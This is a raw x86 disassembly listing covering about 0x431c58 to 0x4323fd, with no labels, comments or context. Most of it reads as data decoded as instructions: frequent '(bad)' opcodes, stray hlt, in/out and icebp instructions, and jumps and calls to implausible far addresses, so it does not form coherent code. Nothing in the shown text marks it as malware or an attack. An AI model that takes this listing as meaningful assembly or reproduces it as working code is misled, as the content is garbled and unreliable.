  431c58:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431c5e:	(bad)  
  431c5f:	cmp    ebx,eax
  431c61:	je     0x431be9
  431c63:	add    edi,edi
  431c65:	or     bh,bh
  431c67:	dec    ebp
  431c68:	inc    ebp
  431c69:	mov    esi,DWORD PTR [ebx]
  431c6b:	cld    
  431c6c:	add    ecx,esi
  431c6e:	cmp    ecx,DWORD PTR [eax-0xc]
  431c71:	mov    edx,DWORD PTR [edi]
  431c73:	or     BYTE PTR [ebp-0x7c],al
  431c76:	mov    ebx,DWORD PTR [edx-0x7639cd18]
  431c7c:	test   BYTE PTR [edx+ebx*4],cl
  431c7f:	inc    ebp
  431c80:	xor    bh,BYTE PTR [eax]
  431c82:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431c89:	jne    0x431c52
  431c8b:	mov    ebp,esp
  431c8d:	fcomp  DWORD PTR [ebx]
  431c8f:	add    BYTE PTR [ecx],al
  431c91:	inc    DWORD PTR [ebp-0x75]
  431c94:	(bad)  
  431c95:	cld    
  431c96:	add    al,0xce
  431c98:	mov    ecx,edi
  431c9a:	cld    
  431c9b:	inc    ebp
  431c9c:	fidivr WORD PTR [ebx]
  431c9e:	fbstp  TBYTE PTR [ebp-0x3e]
  431ca1:	mov    eax,DWORD PTR [eax]
  431ca3:	adc    BYTE PTR [ebx-0x3974038b],cl
  431ca9:	fadd   st,st(7)
  431cab:	add    BYTE PTR [ebp-0x1],al
  431cae:	mov    ecx,DWORD PTR [esp+edi*8]
  431cb1:	inc    ebp
  431cb2:	mov    bh,0xc7
  431cb5:	loopne 0x431cfc
  431cb7:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431cbd:	sbb    al,0x33
  431cbf:	pushf  
  431cc0:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431cc6:	mov    eax,edi
  431cc8:	cwde   
  431cc9:	inc    ebp
  431cca:	inc    ebp
  431ccb:	jne    0x431c58
  431ccd:	mov    esp,esp
  431ccf:	clc    
  431cd0:	add    al,0x4d
  431cd2:	mov    DWORD PTR [ebx],esi
  431cd4:	or     al,0x33
  431cd6:	inc    ebp
  431cd7:	lea    ecx,[ebx-0x398d13fd]
  431cdd:	add    bh,al
  431cdf:	inc    ebp
  431ce0:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431ce7:	add    ebp,esp
  431ce9:	shufps xmm1,xmm3,0xc7
  431ced:	(bad)  
  431cee:	jmp    0x74885817
  431cf3:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431cf9:	hlt    
  431cfa:	mov    ecx,DWORD PTR [edi]
  431cfc:	fadd   DWORD PTR [ebp+0x0]
  431cff:	xor    ecx,DWORD PTR [edi]
  431d01:	add    ecx,ecx
  431d03:	cmp    edi,edi
  431d05:	pmuludq mm7,QWORD PTR [edx+0x50]
  431d09:	(bad)  
  431d0a:	jmp    0x431c97
  431d0c:	mov    edi,esp
  431d0e:	or     al,0xc6
  431d10:	inc    ebp
  431d11:	(bad)  
  431d12:	mov    eax,DWORD PTR [ebp+0x10]
  431d15:	jne    0x431ca0
  431d17:	mov    eax,DWORD PTR [ecx]
  431d19:	clc    
  431d1a:	add    BYTE PTR [ebp-0x40],cl
  431d1d:	xor    edx,DWORD PTR [eax-0x73]
  431d20:	jne    0x431d23
  431d22:	push   DWORD PTR [edx+0x8]
  431d25:	add    BYTE PTR [ebp+0x45],al
  431d28:	mov    ebp,ecx
  431d2a:	cld    
  431d2b:	add    BYTE PTR [ebp+0x0],cl
  431d2e:	xor    eax,DWORD PTR [ebp+0x3]
  431d31:	lea    edi,[ebx]
  431d33:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431d39:	sub    eax,0x5d330e4d
  431d3e:	lea    esi,[ebx]
  431d40:	add    DWORD PTR [ebx],eax
  431d42:	jb     0x431d2d
  431d44:	add    BYTE PTR [eax],al
  431d46:	inc    ebp
  431d47:	add    bl,ch
  431d49:	inc    ebp
  431d4a:	mov    esi,DWORD PTR [ebx]
  431d4c:	or     al,0x3
  431d4e:	(bad)  
  431d4f:	mov    edi,eax
  431d51:	in     al,dx
  431d52:	scas   eax,DWORD PTR es:[edi]
  431d53:	inc    ebp
  431d54:	mov    esi,DWORD PTR [ebx]
  431d56:	in     al,0x3
  431d58:	add    al,0x89
  431d5a:	mov    ecx,DWORD PTR [eax+edi*8]
  431d5d:	dec    ebp
  431d5e:	(bad)  
  431d5f:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3166]
  431d66:	mov    ecx,eax
  431d68:	cld    
  431d69:	push   es
  431d6a:	dec    ebp
  431d6b:	add    al,0x33
  431d6d:	mov    DWORD PTR [ebx],eax
  431d6f:	in     al,dx
  431d70:	cmp    DWORD PTR [ebp-0x67],eax
  431d73:	mov    eax,DWORD PTR [ebp-0xba0068]
  431d79:	mov    edx,DWORD PTR [ebp-0x4]
  431d7c:	mov    ecx,DWORD PTR [ebp-0x2c]
  431d7f:	xor    eax,DWORD PTR [ebp+0x3]
  431d82:	cmp    DWORD PTR [ebx],0x8b327499
  431d88:	xor    edi,esp
  431d8a:	jmp    0xff771adc
  431d8f:	add    ecx,DWORD PTR [ebp-0x3f]
  431d92:	xor    ebx,DWORD PTR [edi]
  431d94:	add    eax,ecx
  431d96:	cmp    ebx,DWORD PTR [eax]
  431d98:	mov    ecx,DWORD PTR [ebp-0x4]
  431d9b:	mov    ecx,DWORD PTR [eax]
  431d9d:	adc    BYTE PTR [ebp-0x80],al
  431da0:	jmp    0x431da3
  431da2:	mov    eax,DWORD PTR [eax]
  431da4:	cld    
  431da5:	mov    bh,0xc6
  431da7:	push   ecx
  431da8:	(bad)  
  431da9:	jne    0x431e09
  431dab:	dec    ecx
  431dad:	or     BYTE PTR [ecx+ebx*1],cl
  431db0:	push   ebp
  431db1:	inc    ebp
  431db2:	in     al,dx
  431db3:	add    ebp,esp
  431db5:	or     bh,al
  431db7:	dec    ebp
  431db8:	cld    
  431db9:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431dbf:	xor    DWORD PTR [edx+eax*1],0xffffff9c
  431dc3:	dec    DWORD PTR [ebx+0x45510cf4]
  431dc9:	mov    DWORD PTR [ebx+0x5345fc0c],ecx
  431dcf:	mov    edx,DWORD PTR [ecx+0xc]
  431dd2:	xor    eax,esi
  431dd4:	mov    edx,0xc172c7
  431dd9:	inc    ebp
  431dda:	mov    esi,DWORD PTR [ebp+0x8]
  431ddd:	mov    eax,edx
  431ddf:	call   0x84c7e4d4
  431de4:	add    DWORD PTR [edx-0x76bace00],ebx
  431dea:	mov    ebp,eax
  431dec:	or     BYTE PTR [eax],dl
  431dee:	jo     0x431e3d
  431df0:	push   edi
  431df1:	xor    esi,DWORD PTR [ebp+0x3]
  431df4:	(bad)  
  431df5:	pmulhuw mm0,mm1
  431df8:	test   DWORD PTR [ebp-0x8],ecx
  431dfb:	mov    DWORD PTR [ebp-0x67],eax
  431dfe:	mov    eax,DWORD PTR [ebp-0x4]
  431e01:	xor    edi,DWORD PTR [ebp-0x73]
  431e04:	xor    eax,DWORD PTR [ebx]
  431e06:	xor    esi,DWORD PTR [edx+0x3]
  431e09:	add    BYTE PTR [ecx],bh
  431e0b:	inc    ebp
  431e0c:	(bad)  
  431e0d:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431e13:	mov    DWORD PTR [eax],0x750f0004
  431e19:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431e1f:	lock add BYTE PTR [ebp+0x0],cl
  431e23:	mov    esi,DWORD PTR [ebp-0x18]
  431e26:	mov    ebp,edx
  431e28:	or     al,0x72
  431e2a:	ja     0x431e2c
  431e2c:	mov    edx,esi
  431e2e:	cld    
  431e2f:	(bad)  
  431e32:	cli    
  431e33:	mov    esi,DWORD PTR [ebp-0x4]
  431e36:	cmp    ecx,esi
  431e38:	bswap  edi
  431e3a:	(bad)
  431e3e:	mov    esi,DWORD PTR [ebp-0x4]
  431e41:	mov    esi,ecx
  431e43:	clc    
  431e44:	repnz add esi,DWORD PTR [ebp+0x45]
  431e48:	push   ebx
  431e49:	xor    eax,DWORD PTR [ebp+0x3]
  431e4c:	cmp    bl,BYTE PTR [edi-0x64]
  431e4f:	pop    ebx
  431e50:	jmp    0x431f17
  431e55:	mov    esi,DWORD PTR [ebp-0x7d]
  431e58:	xor    ebp,DWORD PTR [eax]
  431e5a:	lea    eax,[ebp-0x8]
  431e5d:	xor    eax,0xc7ef9cf2
  431e62:	neg    eax
  431e64:	ins    DWORD PTR es:[edi],dx
  431e65:	test   esi,edi
  431e67:	clc    
  431e68:	pop    esp
  431e69:	inc    ebp
  431e6a:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431e70:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431e76:	add    cl,al
  431e78:	jne    0x431e14
  431e7a:	mov    esi,DWORD PTR [edx]
  431e7c:	in     al,dx
  431e7d:	push   esi
  431e7e:	xor    BYTE PTR [ebp-0xe],dh
  431e81:	add    edi,esi
  431e83:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431e89:	add    cl,bh
  431e8b:	mov    edi,DWORD PTR [ebp+0x8]
  431e8e:	mov    DWORD PTR [ebp-0x14],esi
  431e91:	add    esi,DWORD PTR [ebp+0x3c]
  431e94:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431e9a:	mov    ah,0x38
  431e9c:	call   0xe0e4:0x898b329c
  431ea3:	jne    0x431f1a
  431ea5:	mov    ecx,DWORD PTR [ebx-0xe0e13f4]
  431eab:	shl    edx,0xf2
  431eae:	(bad)  
  431eaf:	mov    ah,0x16
  431eb1:	dec    eax
  431eb2:	jne    0x431e47
  431eb4:	mov    ecx,DWORD PTR [edi]
  431eb6:	in     al,dx
  431eb7:	jmp    0x431eaa
  431eb9:	add    dl,dh
  431ebb:	mov    edi,esi
  431ebd:	or     al,0x8
  431ebf:	inc    ebp
  431ec0:	jne    0x431ec5
  431ec2:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431ec8:	ret    
  431ec9:	or     bh,bh
  431ecb:	jge    0x431eb5
  431ecd:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431ed3:	xor    edi,eax
  431ed5:	add    esi,DWORD PTR [ebp-0x77]
  431ed8:	mov    ebx,esp
  431eda:	clc    
  431edb:	neg    DWORD PTR [ebp-0x7c]
  431ede:	xor    eax,DWORD PTR [eax]
  431ee0:	cmp    eax,DWORD PTR [eax]
  431ee2:	repz jne 0x431e7a
  431ee5:	xor    eax,DWORD PTR [ecx]
  431ee7:	add    ebx,DWORD PTR [eax]
  431ee9:	mov    DWORD PTR [ebp-0x8],eax
  431eec:	mov    eax,edi
  431eee:	cld    
  431eef:	lock pop eax
  431ef1:	test   DWORD PTR [ebx],esi
  431ef3:	clc    
  431ef4:	add    edx,DWORD PTR [edi-0x740bff77]
  431efa:	fdivp  st(4),st
  431efc:	test   ecx,esi
  431efe:	(bad)  
  431eff:	jnp    0x431f00
  431f01:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431f07:	jae    0x431e94
  431f09:	sub    edi,esp
  431f0b:	(bad)  
  431f0c:	shl    DWORD PTR [eax-0x3e],0x89
  431f10:	leave  
  431f11:	call   0x8198d61e
  431f16:	in     al,dx
  431f17:	(bad)  
  431f18:	in     al,dx
  431f19:	add    bh,al
  431f1b:	mov    esp,edi
  431f1d:	in     al,dx
  431f1e:	test   DWORD PTR [ebp-0x8],edi
  431f21:	mov    eax,DWORD PTR [ebp+0x2b]
  431f24:	xor    al,0x3
  431f26:	pushf  
  431f27:	jnp    0x57321b60
  431f2d:	xor    edx,DWORD PTR [ebx-0x77]
  431f30:	push   ecx
  431f31:	loopne 0x431f66
  431f33:	jne    0x431ef0
  431f35:	mov    esi,DWORD PTR [edx-0x20]
  431f38:	add    BYTE PTR [ebp-0x3d],bh
  431f3b:	xor    eax,DWORD PTR [ebp-0x73]
  431f3e:	mov    edi,DWORD PTR [esi]
  431f40:	cld    
  431f41:	jb     0x431f09
  431f43:	add    bl,al
  431f45:	jne    0x431f8c
  431f47:	mov    edx,DWORD PTR [edi-0x10]
  431f4a:	jge    0x431fc9
  431f4c:	mov    esi,DWORD PTR [ebx]
  431f4e:	lock add ecx,DWORD PTR [ebp+0x3b]
  431f52:	xor    esi,DWORD PTR [ebp-0x77]
  431f55:	mov    esi,eax
  431f57:	lock inc ebp
  431f59:	jge    0x431f90
  431f5b:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431f62:	dec    ebp
  431f63:	mov    esi,DWORD PTR [ebx]
  431f65:	loopne 0x431ef0
  431f67:	jge    0x431f61
  431f69:	add    DWORD PTR [ebp-0x7d],eax
  431f6c:	cmc    
  431f6d:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431f74:	dec    ebp
  431f75:	hlt    
  431f76:	xor    ebx,DWORD PTR [ebp-0x77]
  431f79:	mov    esi,esp
  431f7b:	in     al,0x45
  431f7d:	jge    0x431fb8
  431f7f:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431f86:	dec    ebp
  431f87:	dec    esp
  431f88:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431f8e:	inc    ebp
  431f8f:	hlt    
  431f90:	xor    eax,0xb88b9f75
  431f95:	add    al,0x95
  431f97:	icebp  
  431f98:	add    dl,dh
  431f9a:	mov    DWORD PTR [ebp+0x20],ebx
  431f9d:	cmp    eax,DWORD PTR [ebp+0xf]
  431fa0:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431fa4:	fistp  WORD PTR [ebx+0x0]
  431fa7:	inc    ebp
  431fa8:	mov    ebx,DWORD PTR [edi+0xc]
  431fab:	add    eax,eax
  431fad:	inc    ebp
  431fae:	test   BYTE PTR [ebx],dh
  431fb0:	add    eax,DWORD PTR [ebx]
  431fb2:	add    BYTE PTR [esi+0x45],bl
  431fb5:	ret    0x85
  431fb8:	jnp    0x5443a387
  431fbe:	inc    bp
  431fc0:	inc    ebp
  431fc1:	xor    eax,0xc78a9cb9
  431fc6:	add    ah,bl
  431fc8:	xor    eax,DWORD PTR [ebp+0x453bf8b9]
  431fce:	add    BYTE PTR [ebx+0x3],dl
  431fd1:	mov    esi,0x708088b
  431fd6:	cmp    esi,eax
  431fd8:	setp   BYTE PTR [ecx-0x74fcffce]
  431fdf:	mov    esp,edi
  431fe1:	call   0x33ce6533
  431fe6:	or     BYTE PTR [ebx],al
  431fe8:	inc    ecx
  431fe9:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  431fef:	and    BYTE PTR [ebp-0x7074f0bb],al
  431ff5:	lock add cl,al
  431ff8:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  431fff:	mov    ch,0x45
  432001:	clc    
  432002:	xor    eax,DWORD PTR [ebp+0x3]
  432005:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  43200b:	inc    ebp
  43200c:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  432012:	mov    edi,eax
  432014:	mov    eax,DWORD PTR [ebp+0x3c]
  432017:	mov    ecx,DWORD PTR [eax]
  432019:	hlt    
  43201a:	inc    ebp
  43201b:	ror    DWORD PTR [ebx+0x818c45],0xf4
  432022:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  432028:	push   ebp
  432029:	mov    edi,DWORD PTR [ebx]
  43202b:	in     al,dx
  43202c:	jne    0x431fef
  43202e:	mov    eax,DWORD PTR [ebp-0x28]
  432031:	add    DWORD PTR [eax],0xe8058dec
  432037:	clc    
  432038:	mov    esi,DWORD PTR [edi-0x8]
  43203b:	add    dh,dl
  43203d:	rol    WORD PTR [ebp-0x1],cl
  432041:	mov    edx,DWORD PTR [eax+0x8]
  432044:	jne    0x432006
  432046:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  43204d:	inc    ebp
  43204e:	push   esp
  43204f:	test   DWORD PTR [ecx+0xf],ecx
  432052:	sub    edx,esp
  432054:	add    eax,DWORD PTR [eax]
  432056:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  43205c:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  432063:	mov    eax,DWORD PTR [ecx]
  432065:	and    BYTE PTR [eax],al
  432067:	cmp    dl,BYTE PTR [eax]
  432069:	add    BYTE PTR [ebp+0x66],al
  43206c:	inc    ecx
  43206e:	push   esp
  43206f:	add    BYTE PTR [ebp+0x0],dh
  432072:	push   edx
  432073:	enterw 0xc1,0x4d
  432078:	mov    esp,DWORD PTR [esi+0x20]
  43207b:	add    DWORD PTR [ecx-0x7b],eax
  43207e:	add    eax,DWORD PTR [ebx]
  432080:	str    WORD PTR [eax+0x45]
  432084:	lea    ecx,[ebx+0x45890801]
  43208a:	sbb    BYTE PTR [ebx],al
  43208c:	dec    ebp
  43208d:	cmp    al,0xf
  43208f:	inc    ebp
  432090:	push   eax
  432091:	mov    esi,DWORD PTR [ebx]
  432093:	push   eax
  432094:	add    eax,eax
  432096:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  43209d:	inc    ebp
  43209e:	add    BYTE PTR ds:0x8b4d8c00,dh
  4320a4:	xor    edx,esp
  4320a6:	add    eax,esi
  4320a8:	mov    ebx,eax
  4320aa:	loopne 0x4320f1
  4320ac:	dec    ebp
  4320ad:	mov    ecx,DWORD PTR [edi]
  4320af:	cld    
  4320b0:	push   eax
  4320b1:	xchg   DWORD PTR [ebx],esi
  4320b3:	add    DWORD PTR [ebx],ebp
  4320b5:	add    BYTE PTR [ebx],ch
  4320b7:	or     BYTE PTR [ecx],bh
  4320b9:	dec    ecx
  4320ba:	loopne 0x4320bf
  4320bc:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  4320c2:	push   ebp
  4320c3:	add    DWORD PTR [ebx+0x55100800],eax
  4320c9:	dec    ebp
  4320ca:	jmp    0x432055
  4320cc:	mov    esp,DWORD PTR [eax]
  4320ce:	sbb    dl,dl
  4320d0:	inc    eax
  4320d1:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  4320d7:	add    BYTE PTR [ebx+0x74528555],cl
  4320dd:	push   ebp
  4320de:	div    DWORD PTR [ebx]
  4320e0:	and    eax,DWORD PTR [ebx]
  4320e2:	add    edx,DWORD PTR [edx-0x30]
  4320e5:	jno    0x432072
  4320e7:	inc    DWORD PTR [eax+eiz*1]
  4320ea:	inc    ebp
  4320eb:	push   eax
  4320ec:	push   eax
  4320ed:	mov    esp,DWORD PTR [edi-0x74beff1c]
  4320f3:	mov    edi,esp
  4320f5:	push   eax
  4320f6:	inc    ebp
  4320f7:	enter  0x458b,0x8
  4320fb:	push   ecx
  4320fc:	(bad)  
  4320fd:	call   0x10d2ad5
  432102:	pop    ss
  432103:	push   ebp
  432104:	mov    ecx,DWORD PTR [ebx+0x489408]
  43210a:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  432110:	push   ecx
  432111:	jo     0x4320fb
  432113:	inc    DWORD PTR [edi]
  432115:	or     BYTE PTR [eax],al
  432117:	call   0xce2861
  43211c:	fmul   QWORD PTR [ebp+0x55]
  43211f:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  432125:	mov    bh,0x8c
  432127:	adc    al,0x9a
  432129:	dec    esp
  43212a:	xor    bl,BYTE PTR [eax]
  43212c:	mov    ecx,DWORD PTR [ebp+0xc]
  43212f:	mov    eax,DWORD PTR [ebp-0x4]
  432132:	mov    esi,DWORD PTR [edi-0x3148f924]
  432138:	push   es
  432139:	retf   
  43213a:	mov    BYTE PTR [ebp-0x30],0x3b
  43213e:	inc    ebp
  43213f:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432146:	retf   0x83fc
  432149:	into   
  43214a:	dec    ebp
  43214b:	retf   
  43214c:	mov    ecx,DWORD PTR [ebp-0x74]
  43214f:	mov    eax,DWORD PTR [eax]
  432151:	fdiv   QWORD PTR [ebx]
  432153:	mov    bh,0x3
  432155:	push   es
  432156:	mov    esi,ecx
  432158:	sbb    cl,dl
  43215a:	dec    ebp
  43215b:	sar    DWORD PTR [ebx],cl
  43215d:	push   ebp
  43215e:	jne    0x43216f
  432160:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  432166:	lea    ebx,[eax]
  432168:	call   0xf4ccad2f
  43216d:	sbb    dh,dl
  43216f:	add    edx,ebx
  432171:	push   ebp
  432172:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  432178:	push   ecx
  432179:	mov    DWORD PTR [eax-0x30],edx
  43217c:	test   DWORD PTR [edx],eax
  43217e:	xadd   esp,esi
  432181:	pop    es
  432182:	add    cl,dl
  432184:	mov    eax,ecx
  432186:	or     al,0x45
  432188:	(bad)  
  432189:	push   eax
  43218a:	add    DWORD PTR [edx+0x0],eax
  43218d:	add    ecx,DWORD PTR [ecx]
  43218f:	and    dh,cl
  432191:	call   0xc72a61
  432196:	add    DWORD PTR [ebp+0x0],edx
  432199:	mov    esp,DWORD PTR [ebp+0x18]
  43219c:	add    BYTE PTR [eax+0x54],cl
  43219f:	xor    eax,DWORD PTR [eax]
  4321a1:	add    esp,DWORD PTR [esi+0x3b]
  4321a4:	inc    ebp
  4321a5:	je     0x43212a
  4321a7:	push   ecx
  4321a8:	cli    
  4321a9:	dec    ebp
  4321aa:	mov    DWORD PTR [ebx],eax
  4321ac:	(bad)  
  4321ad:	or     al,0x5e
  4321af:	inc    eax
  4321b0:	add    BYTE PTR [ebx],al
  4321b2:	data16 and BYTE PTR [ebp+0x50],al
  4321b6:	sub    DWORD PTR [ecx],0xfffffff8
  4321b9:	add    BYTE PTR [ebp-0x75],ah
  4321bc:	add    BYTE PTR [eax],bl
  4321be:	enter  0x894d,0x8b
  4321c2:	int3   
  4321c3:	loopne 0x4321ff
  4321c5:	rol    BYTE PTR [eax],0x33
  4321c8:	lea    cx,[ebp+0xa]
  4321cc:	data16 jb 0x432214
  4321cf:	add    BYTE PTR [ebx+0x44890855],cl
  4321d5:	sbb    ah,al
  4321d7:	inc    ebp
  4321d8:	cmp    cl,BYTE PTR [edi]
  4321da:	add    BYTE PTR [edx+0x66],dl
  4321dd:	xor    ecx,DWORD PTR [eax]
  4321df:	sub    eax,DWORD PTR [eax]
  4321e1:	mov    eax,DWORD PTR [eax]
  4321e3:	or     al,0x66
  4321e5:	ror    edx,cl
  4321e7:	dec    ebp
  4321e8:	inc    ebp
  4321e9:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4321ef:	cld    
  4321f0:	or     BYTE PTR [edi+0x4501dd],dl
  4321f6:	ror    dh,0xee
  4321f9:	retf   
  4321fa:	(bad)  
  4321fb:	dec    ebp
  4321fc:	mov    al,0x8b
  4321fe:	loop   0x432220
  432200:	cmp    ecx,DWORD PTR [edx]
  432202:	inc    ebp
  432203:	daa    
  432204:	loop   0x43218d
  432206:	out    dx,al
  432207:	add    edi,eax
  432209:	add    BYTE PTR [eax+0x3f52ed55],bh
  43220f:	push   ebp
  432210:	inc    ebp
  432211:	xor    ebx,eax
  432213:	add    ebp,esi
  432215:	push   edx
  432216:	push   bp
  432218:	inc    ebp
  432219:	(bad)  
  43221a:	jmp    0xc342e873
  43221f:	sbb    al,0x33
  432221:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  432228:	add    BYTE PTR [ebp+0x45],0x8b
  43222c:	jmp    0xf98b:0x100041c8
  432233:	xor    esi,DWORD PTR [edx+0x3]
  432236:	mov    ecx,DWORD PTR [edi]
  432238:	fmul   DWORD PTR [edx]
  43223a:	add    BYTE PTR [eax],al
  43223c:	lea    eax,[ebx-0x4700273c]
  432242:	add    al,0x4f
  432244:	pop    DWORD PTR [eax]
  432246:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  43224c:	push   edx
  43224d:	inc    WORD PTR [ebp+0x8]
  432251:	mov    eax,0x514f4d
  432256:	(bad)
  43225a:	add    al,al
  43225c:	xor    DWORD PTR [ebx-0x74baf730],eax
  432262:	test   DWORD PTR [esi+0x74],esp
  432265:	inc    ebp
  432266:	mov    DWORD PTR [eax+0xa4f08],edi
  43226c:	add    BYTE PTR [ecx-0x76c435bb],cl
  432272:	or     dh,cl
  432274:	or     eax,0x8b8d5045
  432279:	inc    ebp
  43227a:	mov    WORD PTR [ecx+0x3b8a00],?
  432280:	jne    0x4322b5
  432282:	mov    edi,DWORD PTR [edx+0x8f3b18]
  432288:	add    DWORD PTR [ebx],eax
  43228a:	add    bh,bh
  43228c:	adc    DWORD PTR [eax],ecx
  43228e:	adc    DWORD PTR [ebp+0x55],edi
  432291:	push   es
  432292:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  432298:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11d8]
  43229f:	inc    ebp
  4322a0:	mov    esp,edi
  4322a2:	or     al,0xd8
  4322a4:	push   eax
  4322a5:	(bad)  
  4322a6:	jne    0x43225c
  4322a8:	call   0x3b1b95
  4322ad:	inc    ebp
  4322ae:	sar    BYTE PTR [edx],0x84
  4322b1:	out    dx,al
  4322b2:	add    bh,al
  4322b4:	add    BYTE PTR [ebp+esi*2-0x247428],bh
  4322bb:	(bad)  
  4322bc:	and    al,al
  4322be:	fs jmp 0x7cc868c3
  4322c4:	bswap  ecx
  4322c6:	scas   al,BYTE PTR es:[edi]
  4322c7:	inc    esp
  4322c8:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  4322cf:	or     BYTE PTR [ebx-0x97717c7],0x83
  4322d6:	call   DWORD PTR [edi]
  4322d8:	shr    ah,0x84
  4322db:	xchg   DWORD PTR [eax],eax
  4322dd:	add    DWORD PTR [eax],eax
  4322df:	add    bh,bh
  4322e1:	dec    ebp
  4322e2:	and    BYTE PTR [ecx-0x38],dl
  4322e5:	push   eax
  4322e6:	dec    DWORD PTR [ebx+0xfd885]
  4322ec:	mov    BYTE PTR [ebp+0x508bac00],cl
  4322f2:	mov    WORD PTR [ecx+0x0],ss
  4322f5:	lea    ecx,[ebx+0x108b20d8]
  4322fb:	mov    WORD PTR [edx],ds
  4322fd:	add    BYTE PTR [edi+0xff01ff],al
  432303:	mov    ecx,DWORD PTR [ebp-0x28]
  432306:	push   ecx
  432307:	shl    BYTE PTR [ebp+0x3a],0x8b
  43230b:	inc    ebp
  43230c:	in     al,0xeb
  43230e:	jno    0x43229b
  432310:	push   edx
  432311:	mov    DWORD PTR [eax-0x28],edx
  432314:	mov    eax,DWORD PTR [ebp+0x20]
  432317:	je     0x4322a0
  432319:	mov    eax,DWORD PTR [ecx]
  43231b:	sbb    BYTE PTR [eax],al
  43231d:	pop    DWORD PTR [eax]
  43231f:	add    esi,eax
  432321:	add    bl,al
  432323:	adc    DWORD PTR [edi],esi
  432325:	jmp    0x8bce7377
  43232a:	sub    BYTE PTR [ebp+eax*2-0x63c4cb00],cl
  432331:	jne    0x4322be
  432333:	mov    ecx,DWORD PTR [eax]
  432335:	in     al,0x75
  432337:	pop    DWORD PTR [ecx+0x5301]
  43233d:	push   edx
  43233e:	inc    DWORD PTR [ebx]
  432340:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432346:	add    BYTE PTR [edi+0x9],dl
  432349:	call   DWORD PTR [esi]
  43234b:	and    dl,al
  43234d:	and    bh,bh
  43234f:	inc    edi
  432351:	test   eax,edx
  432353:	sldt   ebx
  432356:	xor    al,0x0
  432358:	pushf  
  432359:	(bad)  
  43235a:	jmp    0x432368
  43235c:	mov    eax,edi
  43235e:	or     al,0x75
  432360:	inc    eax
  432361:	call   0x431a69
  432366:	mov    eax,eax
  432368:	loopne 0x4322ee
  43236a:	inc    ebp
  43236b:	add    BYTE PTR [ebx+0x1451c00],cl
  432371:	mov    eax,DWORD PTR [ebp+0x20]
  432374:	add    edi,ecx
  432376:	add    BYTE PTR [eax],ch
  432378:	cmp    edi,0x18
  43237b:	test   DWORD PTR [ebp+0xf],esi
  43237e:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  432385:	jne    0x432389
  432387:	call   0xffa21e4c
  43238c:	leave  
  43238d:	rcr    BYTE PTR [esp+eax*4],0x55
  432391:	add    ah,ch
  432393:	add    BYTE PTR [edi-0x48fef979],dh
  432399:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4323a0:	inc    esp
  4323a1:	mov    ebx,DWORD PTR [eax]
  4323a3:	fcom   st(2)
  4323a5:	add    BYTE PTR [edi],bl
  4323a7:	lea    ecx,[eax-0x18]
  4323aa:	(bad)  
  4323ab:	push   DWORD PTR [ecx]
  4323ad:	call   0xffb5710f
  4323b2:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  4323b6:	fstp   DWORD PTR [esi+ebx*8]
  4323b9:	push   ebp
  4323ba:	pop    ebp
  4323bb:	mov    esi,DWORD PTR [edx-0x38]
  4323be:	add    DWORD PTR [eax],0x28
  4323c1:	mov    edi,DWORD PTR [ebx]
  4323c3:	xor    esi,DWORD PTR [edx+0x3]
  4323c6:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  4323ca:	pop    ebp
  4323cb:	or     al,0x4
  4323cd:	inc    ecx
  4323ce:	push   ebp
  4323cf:	(bad)  
  4323d0:	in     al,dx
  4323d1:	or     ah,ch
  4323d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4323d4:	xbegin 0xffc899ca
  4323da:	clc    
  4323db:	adc    al,0x45
  4323dd:	div    BYTE PTR [eax+ecx*1]
  4323e0:	pushf  
  4323e1:	add    bh,al
  4323e3:	jne    0x4323bd
  4323e5:	add    DWORD PTR [ebp+0x5b00f89a],0x66710066
  4323ef:	add    eax,DWORD PTR [ebp+0x52]
  4323f2:	adc    eax,0x20
  4323f5:	xchg   DWORD PTR [ecx+0x4000fc01],ecx
  4323fb:	test   DWORD PTR [eax],eax
  4323fd:	clc    
